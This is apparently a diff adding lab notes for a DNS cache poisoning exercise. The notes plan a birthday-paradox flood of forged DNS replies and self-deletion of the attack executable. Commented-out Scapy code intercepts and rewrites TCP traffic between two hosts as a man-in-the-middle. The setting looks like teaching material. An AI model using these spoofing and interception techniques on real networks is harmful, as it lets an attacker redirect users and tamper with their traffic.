@@ -1,0 +1,75 @@
+# Sculpt DNS Query packet
+
+## compare IP of mapping with our malicious IP, if cmp it true, delete exe, if not launch attack again
+## gold https://stackoverflow.com/questions/10112601/how-to-make-scripts-auto-delete-at-the-end-of-execution
+
+# PHASE 2:
+# Part 1 - Infect via malicious DNS Server:
+# make pico launch out malicious website
+# make malicious DNS server respond with additional malicious mapping to myhwu
+
+# Part 2 - Invect via birthday paradox attack
+# make pico launch B-Day-Attack exe
+# make it run in background
+# send x amount of dns requests
+# if any reply comes with a IP apart from our malicious IP reject and send a cache invalidation packet
+# send x amount of invalidation or dns requests
+# send x amount of fake replies with different 16-bit values
+# if succeded, end, else repeat from step 4
+
+# ADD LOGGING TO FILE
+
+# Look at replies, maybe with another thread?
+
+# Send 256 (2^8) DNS requests for myhwu.hw.ac.uk to 10.0.2.2
+
+# Sniff UDP query packets and invoke spoof_dns() and look at the content to verify if it has:
+# 1. a domain answer containing myhwu.hw.ac.uk
+# 2. check the corresponding IP Mapping:
+# 2a. if the mapping has 10.0.2.4, success
+# 2b. if the mapping is anything else, repeat the attack
+
+
+# #!/usr/bin/env python3
+# from scapy.all import *
+# IP_A = "10.9.0.5"
+# MAC_A = "02:42:0a:09:00:05"
+# IP_B = "10.9.0.6"
+# MAC_B = "02:42:0a:09:00:06"
+# def spoof_pkt(pkt):
+#     if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+#         # Create a new packet based on the captured one.
+#         # 1) We need to delete the checksum in the IP & TCP headers,
+#         # because our modification will make them invalid.
+#         # Scapy will recalculate them if these fields are missing.
+#         # 2) We also delete the original TCP payload.
+#         newpkt = IP(bytes(pkt[IP]))
+#         del(newpkt.chksum)
+#         del(newpkt[TCP].payload)
+#         del(newpkt[TCP].chksum)
+#         #################################################################
+#         # Construct the new payload based on the old payload.
+#         # You need to implement this part.
+#         if pkt[TCP].payload:
+#             data = pkt[TCP].payload.load # The original payload data
+#             message = (data.decode('utf-8')).split()
+#             print(data)
+#             for i in range(len(message)):
+#                 if message[i] == 'daniel':
+#                     message[i] = 'aaaaa'
+#             newdata = ((' '.join(message)).encode('utf-8')) + b'\n'
+#             print(message)
+#             send(newpkt/newdata,verbose=False)
+#         else:
+#             send(newpkt, verbose=False)
+#     ################################################################
+#     elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+#         # Create new packet based on the captured one
+#         # Do not make any change
+#         newpkt = IP(bytes(pkt[IP]))
+#         del(newpkt.chksum)
+#         del(newpkt[TCP].chksum)
+#         send(newpkt, verbose=False)
+
+# f = 'tcp && not src 10.9.0.105'
+# pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
